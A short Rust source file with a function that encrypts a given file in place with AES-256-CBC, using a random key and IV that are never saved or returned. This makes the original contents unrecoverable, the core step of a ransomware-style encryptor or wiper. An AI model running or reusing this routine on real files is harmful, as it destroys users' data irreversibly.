use openssl::rand::rand_bytes;
use openssl::symm::{Cipher, Crypter, Mode};
use rand::RngCore;
use std::{fs, io};

/// Encrypts the given file using AES-CBC
/// Returns a result to avoid crashing on certain files
pub fn encrypt(file_path: &str) -> io::Result<()> {
    let plaintext = fs::read(file_path)?;

    // 32 byte random key
    let mut key = [0u8; 32];
    rand::rng().fill_bytes(&mut key);

    // 16 bytes for IV
    let mut iv = [0u8; 16];
    rand::rng().fill_bytes(&mut iv);

    let cipher = Cipher::aes_256_cbc();
    // safely handle and return errors with cryptor
    let mut crypter = Crypter::new(cipher, Mode::Encrypt, &key, Some(&iv))
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

    // block size is added as a buffer
    let mut ciphertext = vec![0; plaintext.len() + cipher.block_size()];

    // encrypts all complete blocks
    let mut count = crypter
        .update(&plaintext, &mut ciphertext)
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
    // encrypts the last incomplete block if it exists
    count += crypter
        .finalize(&mut ciphertext[count..])
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
    // trims vector
    ciphertext.truncate(count);

    fs::write(file_path, &ciphertext)?;
    Ok(())
}
